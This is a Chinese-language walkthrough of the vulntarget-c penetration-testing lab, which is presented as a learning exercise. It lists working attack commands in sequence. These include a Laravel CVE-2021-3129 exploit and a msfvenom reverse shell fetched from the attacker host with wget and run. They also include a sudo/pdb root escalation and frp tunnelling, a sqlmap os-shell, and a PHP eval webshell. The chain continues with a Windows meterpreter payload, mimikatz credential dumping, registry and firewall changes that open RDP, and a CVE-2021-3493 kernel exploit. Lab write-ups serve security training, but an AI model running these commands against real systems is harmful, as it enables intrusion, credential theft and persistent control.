vulntarget-c

本靶场作为学习使用，包含laravel、OVAS-PHP相关漏洞、隧道代理、免杀、提权、CVE-2021-3129、CVE-2021-3493等。

Github: https://github.com/crow821/vulntarget

这个靶场有三台机器，网络拓扑图如下

这个ubuntu20的IP1为：192.168.27.199

我的kali机器IP为：192.168.27.187

外网信息收集

使用nmap进行全端口扫描

nmap -p- 192.168.27.199

访问80端口

发现是一个框架 Laravel，并且框架版本和php版本都暴露了出来

Laravel v8.78.1 (PHP v7.4.3)

在线查询之后，发现该版本框架存在CVE-2021-3129-Laravel Debug mode 远程代码执行漏洞

Laravel getshell

Laravel Debug模式 _ignition 远程代码执行漏洞 CVE-2021-3129 | PeiQi文库

CVE-2021-3129-Laravel Debug mode 远程代码执行漏洞 - tech_lee - 博客园 (cnblogs.com)

下载工具

git clone https://github.com/SNCKER/CVE-2021-3129cd CVE-2021-3129 git clone https://github.com/ambionics/phpggc.git（exp执行需要使用此工具)

修改exp

vim exploit.py

执行exp

python3 exploit.py

命令执行成功

直接尝试上线msf

攻击机生成linux反向马

msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.27.187 lport=7776 -f elf -o 7776.elf

msf开启监听

msfconsole use exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcp set lport 7776 set lhost 192.168.27.187 run

python开启http服务

python -m SimpleHTTPServer 80

下载木马，赋予权限，执行木马

wget http://192.168.27.187:80/7776.elf&&chmod777 7776.elf&&./7776.elf

并没有回弹成功，猜测是因为执行权限不够

执行pwd命令，看下当前目录

尝试更换路径去执行命令，通过wappalyzer插件收集信息

中间件为Apache，使用Laravel框架搭建，猜测apcahe默认路径

网上查找Laravel源码，文件放在public路径下

cd /var/www/html/public&&wget http://192.168.27.187:80/7776.elf&&chmod777 7776.elf&&./7776.elf

执行脚本

拿到shell

提权

run post/multi/recon/local_exploit_suggester

尝试提权，失败

进入home目录下，查看，发现存在vulntarget文件夹，猜测存在此用户

尝试登录

ssh vulntarget@192.168.27.199

弱口令root成功登录

sudo -l

查看可允许sudo权限的文件

查看root.py文件内容

cat /opt/root.py

分析代码可以看到，其作用是开启一个本地监听，然后接受连接，由于未做输入检查，当输入非数字时，会进入pdb模块，该模块可执行root权限的命令

以sudo运行此文件

另开一个终端，nc进入，输入字母使其报错，密码可以从root.py文件中得到 mortals

之前的终端里面的监听端就会进入 pdb模块，可以通过os模块执行root权限命令

import os os.system('whoami')

使用命令来获取持久化权限

os.system('chmod u+s /bin/bash')

内网信息收集

获取到shell后，查看ip信息，发现存在内网

ip addr 也是查看网络信息的命令

发现存在内网10.0.20.0/24网段

使用 auxiliary/scanner/portscan/tcp 模块进行主机存活扫描

use auxiliary/scanner/portscan/tcp

存活主机10.0.20.100，并且开放了80、443端口

建立frp代理

将frp放到kali目录下，并且用python开启http服务

将frpc和frpc.ini上传到ubuntu20上

一般可以传到/tmp目录下，此处我传到了/var/www/html/public，因为其他目录可能没有权限

在kali上开启frps

./frps -c ./frps.ini

然后我们到靶机刚才上传frpc的位置，给frpc一个权限并运行

chmod 777 frpc ./frpc -c ./frpc.ini

kali上面有了提示

kali使用proxychains进行代理

vi /etc/proxychains4.conf

首先添加代理

proxychains firefox

成功访问

也可以使用FoxyProxy插件进行代理

在windows环境下可以使用proxifier进行代理

并设置一条代理规则

这样所有访问10.0.20.100的应用都会走这条代理

后台Getshell

在登陆点尝试抓包进行爆破

使用常用密码字典进行爆破

可以看到已经爆破出来了，admin/admin123

登录进入后台


访问Inquiries，burpsuite抓包

GET /admin/inquiries/view_details.php?id=1 HTTP/1.1 Host: 10.0.20.100 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0 Accept: / Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Connection: close Referer: http://10.0.20.100/admin/?page=inquiriesCookie: PHPSESSID=63bv8mnc9ap34ppgs2s52qdhj2

使用sqlmap进行getshell

sqlmap -r 1.txt --proxy=socks5://192.168.27.187:8877 --os-shell

如果使用proxifier进行了全局代理的话不用加代理参数

sqlmap -r 1.txt --os-shell

如果是kali使用proxychains进行代理的话

proxychains sqlmap -r 1.txt --os-shell

os-shell是可以执行命令的，当前还是一个system权限

拿到shell

写入一句话木马

echo ^<^?php $a = $_REQUEST['d'];$a = "$a";$b['test'] = "";eval($b['test']."$a");?^>^ > index.php

直接将木马写入index目录下

访问已经显示报错了，使用蚁剑进行连接，密码为d

命令执行成功

免杀defender 上线msf

systeminfo查看系统信息，为windows server 2016

查看内网信息ipconfig

还存在10.0.10.0/24网段

这里我们使用msf，msf获取到的shell还停留在一开始

添加路由，设置socks5代理，

background

退出当前会话

search socks

代理好后生成shell开启监听

(22条消息) msfvenom生成android,msfvenom各平台payload生成_终端研发部的博客-CSDN博客

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.20.141 LPORT=7775 -f exe >shell.exe

use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp set lhost 10.0.20.141 set lport 7775 run

上线后添加路由

使用mimikatz.exe抓取hash

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"

cfa10f59337120a5ea6882b11c1c9f451f5f4ea6

密码为Admin#123

远程登录

开启远程桌面，可以使用下面几个命令

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f

wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1

netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

开启代理远程登录桌面

在任务栏存在远程连接工具，输入本机密码登录成功

内核提权

uname -a

使用一个内核提权exp尝试

#exp https://github.com/briskets/CVE-2021-3493

本机编译好exp，使用tar压缩（直接上传会被defender删）

解压运行
